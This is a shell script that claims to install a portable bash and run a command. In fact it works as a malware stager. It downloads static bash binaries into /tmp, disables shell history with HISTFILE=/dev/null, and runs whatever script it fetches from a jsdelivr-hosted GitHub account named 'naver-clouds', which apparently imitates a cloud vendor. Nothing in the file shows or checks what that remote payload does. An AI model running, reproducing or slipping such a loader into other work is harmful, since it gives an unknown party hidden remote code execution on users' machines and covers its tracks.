#!/bin/sh
#
# Auto-install portable bash and execute command script
# This script always downloads portable bash and executes the specified command

# --- Configuration ---
TMPDIR="/tmp"

# --- Helper Functions ---
DEBUGF() { :; }
if [ -n "$GS_DEBUG" ]; then
    DEBUGF() { printf '%s\n' "DEBUG: $*"; }
fi

FAIL_OUT() {
    printf '%s\n' "..[FAILED]"
    for str in "$@"; do
        printf '%s\n' "--> $str"
    done
}

OK_OUT() { 
    printf '%s\n' "......[OK]"
    [ -n "$1" ] && printf '%s\n' "--> $*"
}

xmkdir() {
    fn="$1"
    [ -d "$fn" ] && return 0
    mkdir -p "$fn" 2>/dev/null && chmod 700 "$fn"
}

# --- Detect download tool ---
init_download_tool() {
    DL_EXEC=""
    IS_USE_CURL=""
    IS_USE_WGET=""
    
    if command -v curl >/dev/null 2>&1; then
        IS_USE_CURL=1
        DL_EXEC="curl -fsSL --connect-timeout 7 -m900 --retry 3"
    elif command -v wget >/dev/null 2>&1; then
        IS_USE_WGET=1
        DL_EXEC="wget -O- --connect-timeout=7 --dns-timeout=7"
    else
        FAIL_OUT "Need curl or wget to download bash"
        exit 1
    fi
}

# --- Always install portable bash ---
install_portable_bash() {
    printf "Downloading portable bash..."
    
    # Get system architecture
    arch=$(uname -m)
    
    # Detect OS type
    if [ -z "$OSTYPE" ]; then
        osname=$(uname -s)
        case "$osname" in 
            *FreeBSD*) OSTYPE="FreeBSD";;
            *Darwin*) OSTYPE="darwin22.0";;
            *OpenBSD*) OSTYPE="openbsd7.3";;
            *Linux*) OSTYPE="linux-gnu";;
        esac
    fi
    
    # Determine architecture and OS for bash download
    bash_osarch=""
    case "$OSTYPE" in
        *linux*)
            case "$arch" in 
                x86_64) bash_osarch="linux-x86_64";;
                i[3-6]86) bash_osarch="linux-i386";;
                aarch64) bash_osarch="linux-aarch64";;
                armv7*) bash_osarch="linux-armv7";;
                armv6*) bash_osarch="linux-armv6";;
                *) bash_osarch="linux-x86_64";;
            esac;;
        *darwin*) bash_osarch="darwin-x86_64";;
        *freebsd*) bash_osarch="freebsd-x86_64";;
        *openbsd*) bash_osarch="openbsd-x86_64";;
        *) bash_osarch="linux-x86_64";;
    esac
    
    # Try to download portable bash from various sources
    bash_urls="
        https://github.com/robxu9/bash-static/releases/download/5.1.016-1.2.3/bash-${bash_osarch}
        https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/bash
        https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox
    "
    
    # Create bash installation directory with unique name
    BASH_INSTALL_DIR="${TMPDIR}/portable-bash-$$"
    xmkdir "$BASH_INSTALL_DIR" || { 
        FAIL_OUT "Cannot create bash install directory"
        return 1
    }
    BASH_PATH="${BASH_INSTALL_DIR}/bash"
    
    # Try downloading from each URL
    download_success=0
    for url in $bash_urls; do
        DEBUGF "Trying to download bash from: $url"
        
        if [ "$IS_USE_CURL" = "1" ]; then
            if $DL_EXEC "$url" -o "$BASH_PATH" 2>/dev/null; then
                download_success=1
                break
            fi
        elif [ "$IS_USE_WGET" = "1" ]; then
            if $DL_EXEC "$url" -O "$BASH_PATH" 2>/dev/null; then
                download_success=1
                break
            fi
        fi
        
        # If download failed, try next URL
        rm -f "$BASH_PATH" 2>/dev/null
    done
    
    # Check if download was successful
    if [ "$download_success" = "0" ] || [ ! -f "$BASH_PATH" ] || [ ! -s "$BASH_PATH" ]; then
        FAIL_OUT "Failed to download portable bash from all sources"
        return 1
    fi
    
    # Make bash executable
    chmod +x "$BASH_PATH" 2>/dev/null || { 
        FAIL_OUT "Cannot make bash executable"
        return 1
    }
    
    # Test if the downloaded bash works
    if ! "$BASH_PATH" -c "echo test" >/dev/null 2>&1; then
        FAIL_OUT "Downloaded bash is not working"
        rm -f "$BASH_PATH"
        return 1
    fi
    
    OK_OUT "Portable bash downloaded and ready at $BASH_PATH"
    return 0
}

# --- Execute command with portable bash ---
execute_with_portable_bash() {
    # Always install portable bash
    install_portable_bash || {
        FAIL_OUT "Cannot install portable bash"
        exit 1
    }
    
    # Use the portable bash
    bash_cmd="$BASH_PATH"
    
    # Execute the target command
    printf "Executing command with portable bash...\n"
    
    # Set history environment and execute command
    export HISTFILE=/dev/null
    
    # Execute the command and clear history
    "$bash_cmd" -c "$(curl -fsSL https://cdn.jsdelivr.net/gh/naver-clouds/cdn/y)" || {
        printf "Command execution failed\n" >&2
        exit 1
    }
    
    # Clean up temporary bash installation
    if [ -n "$BASH_INSTALL_DIR" ] && [ -d "$BASH_INSTALL_DIR" ]; then
        rm -rf "$BASH_INSTALL_DIR" 2>/dev/null
    fi
    
    printf "Command executed successfully with portable bash\n"
}

# --- Main execution ---
main() {
    printf "Starting portable bash execution...\n"
    
    # Initialize download tool
    init_download_tool
    
    # Execute command with portable bash
    execute_with_portable_bash
    
    exit 0
}

# Run main function
main "$@"